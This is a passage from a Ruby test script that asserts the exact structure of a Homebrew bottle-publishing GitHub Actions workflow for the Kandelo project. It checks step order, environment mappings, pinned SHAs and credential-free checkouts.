    'normalize_package_generation wasm32 "$PACKAGE_GENERATION_WASM32"',
    'normalize_package_generation wasm64 "$PACKAGE_GENERATION_WASM64"',
    'validated_kandelo_ref="$(normalize_dry_run_source_ref "Kandelo" "$KANDELO_REF")"',
    'validated_tap_ref="$(normalize_dry_run_source_ref "tap" "$TAP_REF")"',
    'validated_kandelo_ref="$(normalize_write_kandelo_ref "$KANDELO_REF")"',
    'validated_tap_ref="$(normalize_write_tap_ref "$TAP_REF")"',
    'echo "kandelo-ref=$validated_kandelo_ref"',
    'echo "tap-ref=$validated_tap_ref"',
    'echo "package-generation-wasm32=$validated_generation_wasm32"',
    'echo "package-generation-wasm64=$validated_generation_wasm64"',
    'echo "package-generation-kind=$validated_generation_kind"',
    'normalize_revalidation_source()',
    'echo "revalidation-mode=$validated_revalidation_mode"',
    'echo "revalidation-source=$validated_revalidation_source"',
  ].each do |predicate|
    check(validation_run.include?(predicate), "publisher caller validation lacks #{predicate}")
  end
  dry_index = validation_run.index('if [ "$DRY_RUN" = "true" ]')
  caller_index = validation_run.index(
    '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]'
  )
  kandelo_index = validation_run.index('[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]')
  tap_name_index = validation_run.index(
    '[[ "$normalized_tap_repository" =~ ^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$ ]]'
  )
  dry_kandelo_ref_index = validation_run.index(
    'validated_kandelo_ref="$(normalize_dry_run_source_ref "Kandelo" "$KANDELO_REF")"'
  )
  write_kandelo_ref_index = validation_run.index(
    'validated_kandelo_ref="$(normalize_write_kandelo_ref "$KANDELO_REF")"'
  )
  write_tap_ref_index = validation_run.index(
    'validated_tap_ref="$(normalize_write_tap_ref "$TAP_REF")"'
  )
  write_generation_wasm32_index = validation_run.index(
    'validated_generation_wasm32="$(',
    write_tap_ref_index
  )
  write_generation_wasm64_index = validation_run.index(
    'validated_generation_wasm64="$(',
    write_generation_wasm32_index
  )
  check(dry_index && caller_index && kandelo_index && tap_name_index &&
        caller_index < dry_index && kandelo_index < dry_index && tap_name_index < dry_index,
        "publisher dry-run can bypass caller authority validation")
  check(dry_kandelo_ref_index && write_kandelo_ref_index && write_tap_ref_index &&
        dry_index < dry_kandelo_ref_index && dry_kandelo_ref_index < write_kandelo_ref_index &&
        dry_kandelo_ref_index < write_tap_ref_index,
        "publisher does not separate selectable dry-run refs from reviewed write refs")
  check(write_generation_wasm32_index && write_generation_wasm64_index &&
        write_tap_ref_index < write_generation_wasm32_index &&
        write_generation_wasm32_index < write_generation_wasm64_index,
        "publisher does not require both exact package generations on its write path")

  main_admission = named_step(plan_steps, "Admit exact Kandelo main source")
  check(main_admission.keys.sort == %w[env if name run shell] &&
        main_admission["if"] ==
          "${{ !inputs.dry-run && " \
          "steps.trust.outputs.prefix-campaign-mode != 'true' }}" &&
        main_admission["shell"] == "bash" &&
        main_admission["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "KANDELO_SHA" => "${{ steps.trust.outputs.kandelo-ref }}",
        }, "publisher exact-main admission mapping changed")
  [
    '"/repos/$KANDELO_REPOSITORY/git/ref/heads/main"',
    "--jq .object.sha",
    '[[ "$current_main_sha" =~ ^[0-9a-f]{40}$ ]]',
    '[ "$KANDELO_SHA" = "$current_main_sha" ]',
    "write publication requires the current Kandelo refs/heads/main commit",
  ].each do |fragment|
    check(main_admission.fetch("run").include?(fragment),
          "publisher exact-main admission lacks #{fragment}")
  end
  kandelo_checkout = named_step(plan_steps, "Checkout Kandelo workflow source")
  check(plan_steps.index(validation) < plan_steps.index(main_admission) &&
        plan_steps.index(main_admission) < plan_steps.index(kandelo_checkout),
        "publisher checks out Kandelo before exact-main admission")

  vfs_selection = named_step(
    plan_steps, "Validate dependency-bearing VFS acceptance selection"
  )
  check(vfs_selection.keys.sort == %w[env id if name run shell] &&
        vfs_selection["id"] == "vfs-acceptance" &&
        vfs_selection["if"] ==
          "${{ steps.trust.outputs.prefix-campaign-mode != 'true' }}" &&
        vfs_selection["shell"] == "bash" && vfs_selection["env"] == {
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "PACKAGE_GENERATION_KIND" => "${{ steps.trust.outputs.package-generation-kind }}",
          "PLANNED_MATRIX" => "${{ steps.matrix.outputs.matrix }}",
          "REQUIRE_VFS_ACCEPTANCE" => "${{ inputs.require-vfs-acceptance }}",
          "TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher VFS acceptance planning mapping changed")
  vfs_selection_run = vfs_selection.fetch("run")
  [
    'tap_root="$(realpath "$GITHUB_WORKSPACE/tap")"',
    'policy_dir="$GITHUB_WORKSPACE/tap/Kandelo"',
    '[ -L "$policy_dir" ] || { [ -e "$policy_dir" ] && [ ! -d "$policy_dir" ]; }',
    'config_candidate="$policy_dir/vfs-acceptance.json"',
    'if [ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]; then',
    'if [ "$REQUIRE_VFS_ACCEPTANCE" = "true" ]; then',
    'this invocation requires dependency-bearing VFS acceptance',
    'this invocation will produce no closure acceptance evidence',
    'tap VFS acceptance configuration must be a regular non-symlink file',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema"]',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema", "shell_config"]',
    'contains("\u000a") == false', 'contains("\u000d") == false',
    'config="$(realpath "$config_candidate")"',
    'tap VFS acceptance configuration resolved outside the exact tap checkout',
    'formula_candidate="$GITHUB_WORKSPACE/tap/Formula/${selected_formula}.rb"',
    'formula_source="$(realpath "$formula_candidate")"',
    'selected VFS acceptance Formula resolved outside the exact tap checkout',
    'brewfile_candidate="$GITHUB_WORKSPACE/tap/$brewfile_rel"',
    '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
    'brewfile="$(realpath "$brewfile_candidate")"',
    'shell_config_candidate="$GITHUB_WORKSPACE/tap/$shell_config_rel"',
    'tap default-shell config must be a regular non-symlink file',
    'default-shell config resolved outside the exact tap checkout',
    'default-shell config must contain 1 to 65536 bytes',
    'keys == ["argv", "path", "version"]',
    '. kandelo/scripts/homebrew-guest-layout.sh',
    'homebrew_select_guest_layout',
    '"${KANDELO_HOMEBREW_PREFIX_CAMPAIGN_LAYOUT_SHA256:-}"',
    'jq -e --arg prefix "$HOMEBREW_GUEST_PREFIX"',
    'def executable_under($prefix):',
    'startswith($prefix + "/bin/")',
    'startswith($prefix + "/sbin/")',
    'ruby kandelo/scripts/homebrew-brewfile-selection.rb "$brewfile"',
    'expected_tap="$(printf \'%s\' "$TAP_NAME" | tr \'[:upper:]\' \'[:lower:]\')"',
    '.tap_name == $tap and (.packages | index($formula) != null)',
    'any(.[]; .formula == $formula and .arch == "wasm32")',
    'required dependency-bearing VFS acceptance needs a non-dry-run publication',
    'use force when its bottle is already current',
    'echo "formula=$selected_formula" >> "$GITHUB_OUTPUT"',
    '[ "$PACKAGE_GENERATION_KIND" = "rootfs-wasm32" ]',
    'bounded rootfs-wasm32 bottle lane intentionally skips dependency-bearing legacy VFS acceptance',
  ].each do |fragment|
    check(vfs_selection_run.include?(fragment),
          "publisher VFS acceptance planning lacks #{fragment}")
  end
  check(vfs_selection_run.match?(
          /if \[ ! -e "\$config_candidate" \] && \[ ! -L "\$config_candidate" \]; then\n\s+if \[ "\$REQUIRE_VFS_ACCEPTANCE" = "true" \]; then\n\s+echo "::error::[^\n]+"\n\s+exit 1\n\s+fi\n\s+echo "::notice::[^\n]+no closure acceptance evidence"\n\s+exit 0/
        ), "publisher does not distinguish optional absence from required VFS acceptance")
  tap_checkout = named_step(plan_steps, "Checkout tap")
  authority_nix = named_step(
    plan_steps, "Install Nix for Formula authority planning"
  )
  authority_cache = named_step(
    plan_steps, "Cache Nix store for Formula authority planning"
  )
  authority_warm = named_step(plan_steps, "Warm pinned Formula authority tools")
  matrix_plan = named_step(plan_steps, "Plan formula matrix")
  rootfs_authority_condition =
    "${{ steps.trust.outputs.package-generation-kind == 'rootfs-wasm32' }}"
  authority_warm_run = <<~'BASH'
    cd kandelo
    bash scripts/dev-shell.sh bash -c '
      ruby --version
      printf "ruby=%s\n" "$(command -v ruby)" >>"$GITHUB_OUTPUT"
    '
  BASH
  check(authority_nix == {
          "name" => "Install Nix for Formula authority planning",
          "if" => rootfs_authority_condition,
          "uses" => NIX_ACTION,
          "with" => { "github-token" => "" },
        } &&
        authority_cache == {
          "name" => "Cache Nix store for Formula authority planning",
          "if" => rootfs_authority_condition,
          "uses" => MAGIC_NIX_ACTION,
          "with" => { "use-gha-cache" => false, "use-flakehub" => false },
        } &&
        authority_warm.keys.sort == %w[id if name run shell] &&
        authority_warm["id"] == "authority-tools" &&
        authority_warm["if"] == rootfs_authority_condition &&
        authority_warm["shell"] == "bash" &&
        authority_warm["run"] == authority_warm_run,
        "publisher Formula authority tools are not pinned by the repo dev shell")
  check(plan_steps.index(tap_checkout) < plan_steps.index(authority_nix) &&
        plan_steps.index(authority_nix) < plan_steps.index(authority_cache) &&
        plan_steps.index(authority_cache) < plan_steps.index(authority_warm) &&
        plan_steps.index(authority_warm) < plan_steps.index(matrix_plan) &&
        plan_steps.index(matrix_plan) < plan_steps.index(vfs_selection),
        "publisher validates VFS acceptance selection outside the planning trust boundary")
  check(matrix_plan.keys.sort == %w[env id name run shell] &&
        matrix_plan["id"] == "matrix" && matrix_plan["shell"] == "bash" &&
        matrix_plan["env"] == {
          "ARCHES" => "${{ inputs.arches }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "EXPECTED_ABI" => "${{ steps.release.outputs.abi }}",
          "EXPECTED_BOTTLE_ROOT_URL" =>
            "${{ steps.release.outputs.bottle-root-prefix }}",
          "EXPECTED_CACHE_KEYS_JSON" => "${{ inputs.expected-cache-keys }}",
          "EXPECTED_KANDELO_COMMIT" =>
            "${{ steps.source-commits.outputs.kandelo-sha }}",
          "EXPECTED_KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "FORCE_REBUILD" => "${{ inputs.force }}",
          "FORMULAE" => "${{ inputs.formulae }}",
          "KANDELO_HOMEBREW_AUTHORITY_RUBY" =>
            "${{ steps.authority-tools.outputs.ruby }}",
          "PACKAGE_GENERATION_KIND" => "${{ steps.trust.outputs.package-generation-kind }}",
          "PREFIX_CAMPAIGN_MODE" => "${{ steps.trust.outputs.prefix-campaign-mode }}",
          "REQUIRE_VFS_ACCEPTANCE" => "${{ inputs.require-vfs-acceptance }}",
          "TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher matrix planner mapping changed")
  matrix_plan_run = matrix_plan.fetch("run")
  [
    'expected_args+=(--expected-cache-keys "$expected_file")',
    'expected_args+=(--expected-abi "$EXPECTED_ABI")',
    'expected_args+=(--expected-bottle-root-url "$EXPECTED_BOTTLE_ROOT_URL")',
    'expected_args+=(--expected-kandelo-repository "$EXPECTED_KANDELO_REPOSITORY")',
    'expected_args+=(--expected-kandelo-commit "$EXPECTED_KANDELO_COMMIT")',
    '--tap-root "$GITHUB_WORKSPACE/tap"', '--formulae "$FORMULAE"',
    '--arches "$ARCHES"', '"${expected_args[@]}"',
    '[ "$PACKAGE_GENERATION_KIND" = "rootfs-wasm32" ]',
    '[ "$normalized_rootfs_arches" = "wasm32" ]',
    '[ "$REQUIRE_VFS_ACCEPTANCE" = "false" ]',
    '[ "$DRY_RUN" = "false" ]',
    'the rootfs-wasm32 publication lane requires exact runtime materialization and is unavailable in dry-run',
    '[ "$PREFIX_CAMPAIGN_MODE" = "true" ]',
    '[ "$matrix" != \'[]\' ]',
    'map(.formula) | unique | join(",")',
    '--formulae "$planned_formulae"',
    'bash scripts/homebrew-rootfs-publication-selection.sh',
    '--ruby-bin "$KANDELO_HOMEBREW_AUTHORITY_RUBY"',
    '--require-vfs-acceptance "$REQUIRE_VFS_ACCEPTANCE"',
    'echo "rootfs-publication-selection=$rootfs_publication_selection"',
  ].each do |fragment|
    check(matrix_plan_run.include?(fragment),
          "publisher matrix planner lacks #{fragment}")
  end
  check(
    matrix_plan_run.scan(
      "scripts/homebrew-rootfs-publication-selection.sh"
    ).length == 1,
    "publisher matrix planner must invoke the rootfs selection policy exactly once"
  )
  matrix_index = matrix_plan_run.index(
    'matrix="$(bash kandelo/scripts/homebrew-plan-matrix.sh'
  )
  classification_index = matrix_plan_run.index(
    "bash scripts/homebrew-rootfs-publication-selection.sh"
  )
  check(matrix_index && classification_index && matrix_index < classification_index,
        "publisher classifies raw Formula requests before cache-key planning")
  check(matrix_plan_run.scan("--expected-bottle-root-url").length == 1,
        "publisher matrix planner root argument changed")
  check(matrix_plan_run.scan("--expected-kandelo-repository").length == 1 &&
        matrix_plan_run.scan("--expected-kandelo-commit").length == 1,
        "publisher matrix planner exact-main provenance arguments changed")

  release_step = named_step(plan_steps, "Resolve release and bottle root")
  check(release_step.fetch("env") == {
    "REQUESTED_BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
    "REQUESTED_RELEASE_TAG" => "${{ inputs.release-tag }}",
    "TAP_NAME" => "${{ inputs.tap-name }}",
    "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
  }, "publisher bottle root identity mapping changed")
  release_run = release_step.fetch("run")
  check(release_run.include?('expected_release_tag="bottles-abi-v${abi}"') &&
        release_run.include?('[ "$release_tag" != "$expected_release_tag" ]') &&
        release_run.include?('. kandelo/scripts/homebrew-tap-identity.sh') &&
        release_run.include?(
          'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_NAME"'
        ), "publisher does not bind release tag and bottle root to resolved identities")
  planner_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-plan-matrix.sh"))
  check(planner_source.include?("formula selection must not be empty") &&
        planner_source.include?("architecture selection must not be empty") &&
        planner_source.include?(
          ".built_from.kandelo_repository == $expected_kandelo_repository"
        ) &&
        planner_source.include?(
          ".built_from.kandelo_commit == $expected_kandelo_commit"
        ) &&
        planner_source.include?(
          ".built_from.formula_sha256 == $formula_identities[$formula]"
        ) &&
        planner_source.include?(
          'if [ -L "$(formula_file_for "$formula")" ]'
        ) &&
        planner_source.include?(
          "--expected-kandelo-repository must be Automattic/kandelo"
        ) &&
        planner_source.include?(
          "--expected-kandelo-commit is required with cache keys"
        ),
        "publisher planner selection or exact-main reuse boundary changed")
  dependency_taps_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-dependency-taps.py")
  )
  [
    '"kandelo-dev/tap-core": "kandelo-dev/homebrew-tap-core"',
    'COMMIT = re.compile(r"^[0-9a-f]{40}$")',
    'if ALLOWED_DEPENDENCY_TAPS.get(name) != repository:',
    'git_output(root, "status", "--short", "--untracked-files=all")',
    'if set(dependency_roots) != expected_names:',
    'verify_checkout(root, item["tap_commit"]',
    'write_json(pathlib.Path(args.out), resolved)',
  ].each do |fragment|
    check(dependency_taps_source.include?(fragment),
          "publisher immutable dependency-tap resolver lacks #{fragment}")
  end
  public_tap_checkout_path = File.join(
    REPO_ROOT, "scripts/homebrew-checkout-public-tap.sh"
  )
  public_tap_checkout_source = File.read(public_tap_checkout_path)
  check((File.stat(public_tap_checkout_path).mode & 0o111).positive?,
        "public dependency-tap checkout helper is not executable")
  [
    '[ "$repository" = "kandelo-dev/homebrew-tap-core" ]',
    '[[ "$commit" =~ ^[0-9a-f]{40}$ ]]',
    'destination must be an immediate child of GITHUB_WORKSPACE/dependency-taps',
    'dependency-taps path is not owned by the runner user',
    'dependency-taps path must have mode 0700',
    '/usr/bin/env -i',
    'GIT_CONFIG_NOSYSTEM=1',
    'GIT_CONFIG_GLOBAL=/dev/null',
    'GIT_TERMINAL_PROMPT=0',
    '-c credential.helper=',
    '-c core.askPass=',
    '-c http.https://github.com/.extraheader=',
    'fetch \\',
    '--no-tags --no-recurse-submodules --depth=1 origin "$commit"',
    '[ "$fetched_commit" = "$commit" ]',
    '[ "$head_commit" = "$commit" ]',
    'status --porcelain=v1 --untracked-files=all',
  ].each do |fragment|
    check(public_tap_checkout_source.include?(fragment),
          "public dependency-tap checkout helper lacks #{fragment}")
  end
  publisher_source = File.read(PUBLISHER_PATH)
  check(publisher_source.lines.none? { |line| line.match?(/^\s+token: ""\s*$/) },
        "publisher still uses an empty actions/checkout token")
  check(plan["outputs"] == {
    "matrix" => "${{ steps.matrix.outputs.matrix }}",
    "formula-matrix" => "${{ steps.matrix.outputs.formula-matrix }}",
    "abi" => "${{ steps.release.outputs.abi }}",
    "release-tag" => "${{ steps.release.outputs.release-tag }}",
    "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
    "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
    "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
    "package-generation-wasm32" => "${{ steps.trust.outputs.package-generation-wasm32 }}",
    "package-generation-wasm64" => "${{ steps.trust.outputs.package-generation-wasm64 }}",
    "package-generation-kind" => "${{ steps.trust.outputs.package-generation-kind }}",
    "core-dependency-tap-sha" => "${{ steps.dependency-taps.outputs.core-tap-sha }}",
    "rootfs-publication-selection" =>
      "${{ steps.matrix.outputs.rootfs-publication-selection }}",
    "vfs-acceptance-formula" => "${{ steps.vfs-acceptance.outputs.formula }}",
    "prefix-campaign-mode" =>
      "${{ steps.trust.outputs.prefix-campaign-mode }}",
    "prefix-campaign-tag" =>
      "${{ steps.trust.outputs.prefix-campaign-tag }}",
    "prefix-campaign-dependencies" =>
      "${{ steps.trust.outputs.prefix-campaign-dependencies }}",
    "prefix-campaign-layout-sha256" =>
      "${{ steps.campaign-source.outputs.prefix-campaign-layout-sha256 }}",
    "artifact-name-prefix" =>
      "${{ steps.artifact-scope.outputs.prefix }}",
    "revalidation-mode" => "${{ steps.trust.outputs.revalidation-mode }}",
    "revalidation-source" => "${{ steps.trust.outputs.revalidation-source }}",
  }, "publisher plan outputs changed")

  campaign_materializations = [
    [
      plan_steps,
      "Materialize sealed prefix-campaign tap source",
      "${{ steps.trust.outputs.prefix-campaign-mode == 'true' }}",
      false,
      nil,
    ],
    [
      build_steps,
      "Prepare sealed campaign Formula dependencies",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      true,
      "kandelo",
    ],
    [
      build_steps,
      "Recreate sealed campaign source for post-build review",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      true,
      "kandelo-postbuild",
    ],
    [
      upload_steps,
      "Materialize sealed campaign source for upload validation",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      true,
      nil,
    ],
    [
      index_steps,
      "Materialize sealed campaign source for index validation",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      false,
      nil,
    ],
    [
      verify_steps,
      "Prepare sealed campaign dependencies for verification",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      true,
      "kandelo",
    ],
    [
      verify_steps,
      "Recreate sealed campaign source for post-verification review",
      "${{ needs.plan.outputs.prefix-campaign-mode == 'true' }}",
      true,
      "kandelo-postverify",
    ],
  ]
  campaign_materializations.each do |steps, name, condition, per_arch, checkout|
    step = named_step(steps, name)
    run = step.fetch("run")
    env = step.fetch("env")
    check(step["if"] == condition && step["shell"] == "bash",
          "publisher campaign materialization #{name.inspect} is not gated")
    {
      "CAMPAIGN_DEPENDENCIES" => "prefix-campaign-dependencies",
      "CAMPAIGN_TAG" => "prefix-campaign-tag",
      "FORMULA" => nil,
      "KANDELO_SHA" => "kandelo-sha",
      "TAP_NAME" => nil,
      "TAP_REPOSITORY" => nil,
      "TAP_SHA" => "tap-sha",
    }.each_key do |key|
      check(env.key?(key),
            "publisher campaign materialization #{name.inspect} lacks #{key}")
    end
    check(env["GH_TOKEN"] == "${{ github.token }}",
          "publisher campaign materialization #{name.inspect} lacks API auth")
    check(env.key?("ARCH") == per_arch,
          "publisher campaign materialization #{name.inspect} arch scope changed")
    [
      "homebrew-prefix-campaign-publisher.py",
      "prepare",
      '--source-tap-commit "$TAP_SHA"',
      '--campaign-tag "$CAMPAIGN_TAG"',
      '--dependencies "$CAMPAIGN_DEPENDENCIES"',
      '--formula "$FORMULA"',
      '--github-env "$GITHUB_ENV"',
    ].each do |fragment|
      check(run.include?(fragment),
            "publisher campaign materialization #{name.inspect} lacks #{fragment}")
    end
    check(run.include?('--arch "$ARCH"') == per_arch,
          "publisher campaign materialization #{name.inspect} arch binding changed")
    if checkout
      check(run.include?("cd #{checkout}\n") &&
            run.include?("bash scripts/dev-shell.sh"),
            "publisher campaign materialization #{name.inspect} uses another flake")
    end
  end
  campaign_plan = named_step(
    plan_steps, "Materialize sealed prefix-campaign tap source"
  )
  check(campaign_plan["id"] == "campaign-source" &&
        campaign_plan.fetch("run").include?('--github-output "$GITHUB_OUTPUT"'),
        "publisher campaign plan does not export its sealed layout authority")
  artifact_scope = named_step(
    plan_steps, "Select collision-free artifact namespace"
  )
  check(
    artifact_scope.keys.sort == %w[env id name run shell] &&
      artifact_scope["id"] == "artifact-scope" &&
      artifact_scope["shell"] == "bash" &&
      artifact_scope["env"] == {
        "ADMISSION_KIND" =>
          "${{ steps.campaign-source.outputs." \
          "prefix-campaign-destination-admission-kind }}",
        "DRY_RUN" => "${{ inputs.dry-run }}",
        "PREFIX_CAMPAIGN_MODE" =>
          "${{ steps.trust.outputs.prefix-campaign-mode }}",
      },
    "publisher bootstrap artifact namespace mapping changed"
  )
  [
    '[ "$PREFIX_CAMPAIGN_MODE" = "true" ]',
    '[ "$DRY_RUN" = "true" ]',
    'first-package-namespace-bootstrap-required',
    'prefix="prefix-campaign-bootstrap-dry-run-"',
    'echo "prefix=$prefix" >>"$GITHUB_OUTPUT"',
  ].each do |fragment|
    check(
      artifact_scope.fetch("run").include?(fragment),
      "publisher bootstrap artifact namespace lacks #{fragment}"
    )
  end
  check(
    plan_steps.index(campaign_plan) < plan_steps.index(artifact_scope),
    "publisher selects bootstrap artifact names before campaign admission"
  )

  [
    [build_steps, "Create strict bottle data handoff"],
    [
      build_steps,
      "Compose deterministic Homebrew OCI child without credentials",
    ],
    [
      upload_steps,
      "Validate build data before exposing upload credentials",
    ],
    [upload_steps, "Revalidate upload receipt as data"],
    [
      verify_steps,
      "Validate build handoff and reconstruct canonical bottle JSON",
    ],
    [verify_steps, "Validate receipt against exact bottle bytes"],
    [
      verify_steps,
      "Force-pour and test the exact selected bottle without credentials",
    ],
    [
      verify_steps,
      "Package validated data-only publication handoff",
    ],
  ].each do |steps, name|
    run = named_step(steps, name).fetch("run")
    check(
      run.include?('--tap-commit "$KANDELO_HOMEBREW_TAP_COMMIT"') &&
        run.include?("--tap-checkout-commit") &&
        run.include?(
          '"${KANDELO_HOMEBREW_PREPARED_TAP_COMMIT:-' \
          '$KANDELO_HOMEBREW_TAP_COMMIT}"'
        ),
      "publisher #{name.inspect} conflates tap source and checkout identity"
    )
  end

  source_commits = named_step(plan_steps, "Resolve source commits")
  check(source_commits.keys.sort == %w[env id name run shell] &&
        source_commits["id"] == "source-commits" &&
        source_commits["shell"] == "bash" &&
        source_commits["env"] == {
          "PREFIX_CAMPAIGN_MODE" =>
            "${{ steps.trust.outputs.prefix-campaign-mode }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "REQUESTED_KANDELO_SHA" => "${{ inputs.kandelo-ref }}",
        }, "publisher source-commit resolution mapping changed")
  [
    '[ "$DRY_RUN" = "false" ]',
    '[ "$PREFIX_CAMPAIGN_MODE" = "true" ]',
    '[ "$kandelo_sha" != "$REQUESTED_KANDELO_SHA" ]',
    "Kandelo checkout differs from the exact admitted main commit",
  ].each do |fragment|
    check(source_commits.fetch("run").include?(fragment),
          "publisher source checkout binding lacks #{fragment}")
  end
  tap_source_binding = named_step(
    plan_steps, "Bind write tap source to protected main history"
  )
  check(tap_source_binding.keys.sort == %w[env if name run shell] &&
        tap_source_binding["if"] ==
          "${{ !inputs.dry-run || " \
          "steps.trust.outputs.prefix-campaign-mode == 'true' }}" &&
        tap_source_binding["shell"] == "bash" &&
        tap_source_binding["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "REQUESTED_TAP_SHA" => "${{ inputs.tap-ref }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "TAP_SHA" => "${{ steps.source-commits.outputs.tap-sha }}",
        }, "publisher protected-main tap source binding changed")
  [
    '[ "$TAP_SHA" = "$REQUESTED_TAP_SHA" ]',
    'tap checkout differs from the exact requested source commit',
    '"/repos/$TAP_REPOSITORY/compare/$TAP_SHA...main"',
    'if ! compare_status="$(gh api',
    "could not prove that the requested tap commit belongs to protected main",
    "ahead|identical) ;;",
    "requested tap commit must remain on protected main history",
  ].each do |fragment|
    check(tap_source_binding.fetch("run").include?(fragment),
          "publisher protected-main tap source binding lacks #{fragment}")
  end
  revalidation_admission = named_step(
    plan_steps, "Admit exact prior-run revalidation evidence"
  )
  check(revalidation_admission.keys.sort == %w[env if name run shell] &&
        revalidation_admission["if"] ==
          "${{ steps.trust.outputs.revalidation-mode == 'true' }}" &&
        revalidation_admission["shell"] == "bash" &&
        revalidation_admission["env"] == {
          "ARCHES" => "${{ inputs.arches }}",
          "FORMULAE" => "${{ inputs.formulae }}",
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "REVALIDATION_SOURCE" =>
            "${{ steps.trust.outputs.revalidation-source }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
        }, "publisher prior-run admission mapping changed")
  [
    '"/repos/$TAP_REPOSITORY/actions/runs/$run_id/attempts/$run_attempt"',
    '.head_branch == "main"',
    '.path == ".github/workflows/prefix-campaign-bottles.yml"',
    '.referenced_workflows[]',
    '"reusable-homebrew-bottle-publish.yml@" + $producer_kandelo',
    '.sha == $producer_kandelo',
    '"/repos/$TAP_REPOSITORY/actions/jobs/$job_id"',
    '.workflow_name == "Publish prefix-campaign bottle"',
    '.conclusion == $conclusion',
    'exact_step(16; "Download strict build handoff"; "success")',
    'exact_step(21; "Create local dry-run upload receipt"; "skipped")',
    'exact_step(24; "Fail when a required handoff is absent"; "skipped")',
    'exact_step(30; "Prepare the supported interactive browser demo graph"; "failure")',
    'select(.number >= 31 and .number <= 51)] | length) == 21',
    '.number >= 31 and .number <= 51',
    '"/repos/$KANDELO_REPOSITORY/compare/$producer_kandelo...main"',
    '"/repos/$TAP_REPOSITORY/actions/artifacts/$artifact_id"',
    '.size_in_bytes == $size',
    '.expired == false',
    '.workflow_run.id == $run_id',
    '.workflow_run.head_sha == $head_sha',
  ].each do |fragment|
    check(revalidation_admission.fetch("run").include?(fragment),
          "publisher prior-run admission lacks #{fragment}")
  end
  release = named_step(plan_steps, "Resolve release and bottle root")
  matrix = named_step(plan_steps, "Plan formula matrix")
  check(plan_steps.index(kandelo_checkout) < plan_steps.index(source_commits) &&
        plan_steps.index(source_commits) < plan_steps.index(tap_source_binding) &&
        plan_steps.index(tap_source_binding) < plan_steps.index(revalidation_admission) &&
        plan_steps.index(revalidation_admission) < plan_steps.index(campaign_plan) &&
        plan_steps.index(tap_source_binding) < plan_steps.index(release) &&
        plan_steps.index(release) < plan_steps.index(matrix),
        "publisher resolves immutable sources outside the planning boundary")

  expected_uses = [
    *Array.new(23, CHECKOUT_ACTION),
    *Array.new(6, NIX_ACTION),
    *Array.new(3, MAGIC_NIX_ACTION),
    *Array.new(13, UPLOAD_ACTION),
    *Array.new(14, DOWNLOAD_ACTION),
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "publisher action set or pin changed")

  checkout_view = lambda do |steps|
    steps.select { |step| step["uses"] == CHECKOUT_ACTION }.map do |step|
      { "name" => step["name"], "if" => step["if"], "with" => step["with"] }
    end
  end
  public_core_checkout = lambda do |steps, name, condition, ref, path, source_root|
    step = named_step(steps, name)
    slash = "\\"
    expected_run = [
      "/usr/bin/bash #{source_root}/scripts/homebrew-checkout-public-tap.sh #{slash}",
      "  kandelo-dev/homebrew-tap-core \"$CORE_TAP_SHA\" #{slash}",
      "  \"$GITHUB_WORKSPACE/#{path}\"",
      "",
    ].join("\n")
    check(step == {
      "name" => name,
      "if" => condition,
      "shell" => "bash",
      "env" => { "CORE_TAP_SHA" => ref },
      "run" => expected_run,
    }, "publisher public core checkout #{name.inspect} changed")
  end
  check(checkout_view.call(plan_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ steps.trust.outputs.kandelo-ref }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ steps.trust.outputs.tap-ref }}", "path" => "tap",
        "fetch-depth" => 0,
      },
    },
  ], "publisher plan checkout wiring changed")
  check(checkout_view.call(build_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
